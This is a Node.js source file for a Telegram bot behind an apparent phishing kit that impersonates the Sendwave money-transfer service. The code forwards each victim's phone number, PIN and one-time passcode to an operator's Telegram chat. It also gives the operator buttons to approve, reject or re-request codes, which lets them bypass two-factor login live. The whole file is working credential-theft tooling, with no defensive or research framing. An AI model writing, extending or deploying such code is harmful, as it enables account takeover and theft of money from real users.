const fetch = require('node-fetch');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// ── Persistent session store (survives restarts) ──
const SESSION_FILE = path.join(__dirname, 'sessions.json');

function loadSessions() {
  try {
    if (fs.existsSync(SESSION_FILE)) {
      return JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8'));
    }
  } catch (e) { console.error('Failed to load sessions:', e.message); }
  return {};
}

function saveSessions(sessions) {
  try {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions), 'utf8');
  } catch (e) { console.error('Failed to save sessions:', e.message); }
}

function setSession(sessionId, status) {
  const sessions = loadSessions();
  sessions[sessionId] = status;
  saveSessions(sessions);
}

function getSession(sessionId) {
  const sessions = loadSessions();
  return sessions[sessionId] || 'pending';
}

function deleteSession(sessionId) {
  const sessions = loadSessions();
  delete sessions[sessionId];
  saveSessions(sessions);
}

class SendwaveBot {
  constructor(token, adminId) {
    this.botToken = token;
    this.adminChatId = adminId;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}/`;
  }

  async sendRequest(method, data = {}) {
    const url = this.apiUrl + method;
    try {
      const params = new URLSearchParams(data);
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params.toString()
      });
      return await response.json();
    } catch (err) {
      console.error(`Telegram API error [${method}]:`, err.message);
      return null;
    }
  }

  generateSessionId(phone) {
    const raw = phone + Date.now() + crypto.randomBytes(8).toString('hex');
    return crypto.createHash('md5').update(raw).digest('hex');
  }

  async sendLoginAlert(countryFlag, countryCode, phone, pin) {
    const sessionId = this.generateSessionId(phone);
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const fullPhone = `${countryCode}${phone}`;

    const keyboard = {
      inline_keyboard: [[
        { text: '🔑 Request OTP', callback_data: `otp_request_${sessionId}` },
        { text: '❌ Wrong PIN',   callback_data: `wrong_pin_${sessionId}` }
      ]]
    };

    const message =
      `🌊 *New Sendwave Login*\n\n` +
      `${countryFlag} *Phone:* \`${fullPhone}\`\n` +
      `🔢 *PIN:* \`${pin}\`\n` +
      `⏰ *Time:* ${now}\n\n` +
      `Choose action:`;

    await this.sendRequest('sendMessage', {
      chat_id: this.adminChatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify(keyboard)
    });

    setSession(sessionId, 'pending');
    console.log(`✅ Session created: ${sessionId}`);

    return { success: true, sessionId };
  }

  async sendOtpAlert(sessionId, otp, countryCode, phone) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const fullPhone = `${countryCode}${phone}`;

    const keyboard = {
      inline_keyboard: [[
        { text: '❌ Wrong Code', callback_data: `wrong_${sessionId}` },
        { text: '✅ Continue',   callback_data: `continue_${sessionId}` }
      ]]
    };

    const message =
      `🔑 *OTP Entered — Sendwave*\n\n` +
      `📱 *Phone:* \`${fullPhone}\`\n` +
      `🔢 *OTP:* \`${otp}\`\n` +
      `⏰ *Time:* ${now}\n\n` +
      `Choose action:`;

    return await this.sendRequest('sendMessage', {
      chat_id: this.adminChatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify(keyboard)
    });
  }

  async handleCallback(callbackQuery) {
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;

    console.log(`🔔 Callback received: ${data}`);

    if (data.startsWith('otp_request_')) {
      const sessionId = data.replace('otp_request_', '');
      setSession(sessionId, 'approved');
      console.log(`✅ Approved: ${sessionId}`);
    } else if (data.startsWith('wrong_pin_')) {
      const sessionId = data.replace('wrong_pin_', '');
      setSession(sessionId, 'wrong_pin');
      console.log(`❌ Wrong PIN: ${sessionId}`);
    } else if (data.startsWith('wrong_')) {
      const sessionId = data.replace('wrong_', '');
      setSession(sessionId, 'wrong_code');
      console.log(`❌ Wrong Code: ${sessionId}`);
    } else if (data.startsWith('continue_')) {
      const sessionId = data.replace('continue_', '');
      setSession(sessionId, 'continue');
      console.log(`➡️ Continue: ${sessionId}`);
    }

    await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
    return true;
  }

  getSessionStatus(sessionId) {
    const status = getSession(sessionId);
    console.log(`🔍 Checking session ${sessionId}: ${status}`);
    if (status !== 'pending') {
      setTimeout(() => { deleteSession(sessionId); }, 5000);
    }
    return status;
  }
}

module.exports = SendwaveBot;
